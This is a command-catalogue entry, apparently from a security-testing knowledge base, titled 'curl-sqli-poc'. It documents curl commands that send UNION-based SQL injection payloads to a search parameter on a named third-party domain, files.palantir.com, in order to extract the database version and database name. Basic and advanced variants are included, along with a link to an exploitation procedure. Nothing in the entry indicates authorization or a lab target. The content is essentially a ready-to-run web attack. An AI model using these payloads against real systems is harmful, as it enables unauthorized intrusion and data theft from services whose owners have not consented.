---
id: cmd-uuid-001
name: curl-sqli-poc
type: command
executor: bash
data: >-
  curl "https://files.palantir.com/search?file=1' UNION SELECT 1,@@version,3--"
  -v
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.446Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - sqli
  - web
  - test
verified: false
validated: true
submitted: true
---

# curl-sqli-poc

## Command

```bash
curl "https://files.palantir.com/search?file=1' UNION SELECT 1,@@version,3--" -v
```

## Description

This command uses curl to send a SQL Injection payload via a GET request to test for vulnerability in the file parameter of the Palantir files service. The -v flag enables verbose output to inspect headers and responses for errors or leaked data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with injected payload | Yes |
| -v | Verbose mode for detailed response | No |

## Examples

### Basic Usage

```bash
curl "https://files.palantir.com/search?file=1'" -v
```

### Advanced Usage

```bash
curl "https://files.palantir.com/search?file=1' UNION SELECT 1,database(),3--" -v
```

## Expected Output

Verbose HTTP response including body with potential SQL errors or injected data like database version (e.g., "5.7.34" in response content).

## Related

- [[Related Procedure: Exploit-SQL-Injection-in-Web-Parameter]]
